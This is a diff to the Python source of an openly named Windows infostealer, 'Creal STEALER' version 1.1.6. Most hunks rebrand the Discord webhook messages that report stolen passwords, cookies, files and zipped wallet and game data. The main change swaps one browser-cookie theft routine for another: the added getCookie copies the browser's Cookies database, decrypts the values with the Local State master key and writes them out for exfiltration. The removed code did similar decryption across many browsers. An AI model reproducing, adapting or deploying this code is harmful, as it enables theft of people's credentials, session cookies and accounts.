@@ -8,14 +8,12 @@ from json import loads as json_loads, load
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from urllib.request import Request, urlopen
 from json import loads, dumps
-import sqlite3
 import time
 import shutil
 from zipfile import ZipFile
 import random
 import re
 import subprocess
-from shutil import copy2
 
 #  THIS IS 1.1.6 VERSION
 #
@@ -332,7 +330,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal STEALER",
+                "text": "CREAL STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 },
             "thumbnail": {
@@ -373,12 +371,12 @@ def upload(name, link):
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [CrealCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@Creal STEALER",
+                        "text": "@CREAL STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "Creal",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -399,12 +397,12 @@ def upload(name, link):
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [CrealPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@Creal STEALER",
+                        "text": "@CREAL STEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                     }
                 }
             ],
-            "username": "Creal",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -427,12 +425,12 @@ def upload(name, link):
                     "name": "Creal | File Stealer"
                 },
                 "footer": {
-                    "text": "@Creal STEALER",
+                    "text": "@CREAL STEALER",
                     "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
                 }
                 }
             ],
-            "username": "Creal",
+            "username": "CREAL",
             "avatar_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg",
             "attachments": []
             }
@@ -453,7 +451,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--CREAL STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -512,91 +510,43 @@ def getPassw(path, arg):
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
-def __init__(self) -> None:
-        self.appdata = os.getenv('LOCALAPPDATA')
-        self.roaming = os.getenv('APPDATA')
-        self.browsers = {
-            'amigo': self.appdata + '\\Amigo\\User Data',
-            'torch': self.appdata + '\\Torch\\User Data',
-            'kometa': self.appdata + '\\Kometa\\User Data',
-            'orbitum': self.appdata + '\\Orbitum\\User Data',
-            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
-            '7star': self.appdata + '\\7Star\\7Star\\User Data',
-            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
-            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
-            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
-            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
-            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
-            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
-            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
-            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-            'iridium': self.appdata + '\\Iridium\\User Data',
-        }
+Cookies = []    
+def getCookie(path, arg):
+    global Cookies, CookiCount
+    if not os.path.exists(path): return
 
-        self.profiles = [
-            'Default',
-            'Profile 1',
-            'Profile 2',
-            'Profile 3',
-            'Profile 4',
-            'Profile 5',
-        ]
+    pathC = path + arg + "/Cookies"
+    if os.stat(pathC).st_size == 0: return
 
-        for name, path in self.browsers.items():
-            if not os.path.isdir(path):
-                continue
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
-            self.masterkey = self.get_master_key(path + '\\Local State')
-            self.funcs = [
-                self.cookies, 
-                self.history, 
-                self.passwords,
-                self.credit_cards
-                ]
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
 
-            for profile in self.profiles:
-                for func in self.funcs:
-                    try:
-                        func(name, path, profile)
-                    except:
-                        pass
-        def get_master_key(self, path: str) -> str:
-            with open(path, "r", encoding="utf-8") as f:
-                c = f.read()
-            local_state = json.loads(c)
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
+    pathKey = path + "/Local State"
 
-        def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
 
-
-        def cookies(self, name: str, path: str, profile: str) -> None:
-            path += '\\' + profile + '\\Network\\Cookies'
-            if not os.path.isfile(path):
-                return
-            copy2(path, "Cookievault.db")
-            conn = sqlite3.connect("Cookievault.db")
-            cursor = conn.cursor()
-            with open('.\\browser-cookies.txt', 'a', encoding="utf-8") as f:
-                for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
-                    host_key, name, path, encrypted_value, expires_utc = res
-                    value = self.decrypt_password(encrypted_value, self.masterkey)
-                    if host_key and name and value != "":
-                        f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                            host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
-            cursor.close()
-            conn.close()
-            os.remove("Cookievault.db")
-  
-
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in cookiWords: cookiWords.append(old)
+            Cookies.append(f"{row[0]}   TRUE    /   FALSE   2597573456  {row[1]}    {DecryptValue(row[2], master_key)}")
+            CookiCount += 1
+    writeforfile(Cookies, 'cook')
     
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
@@ -666,11 +616,11 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "CREAL Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@Creal STEALER",
+                "text": "@CREAL STEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/969959772780634152/1035817071830904842/8df7a3389893f1d1ce1d4351c4076440.jpg"
             }
             }
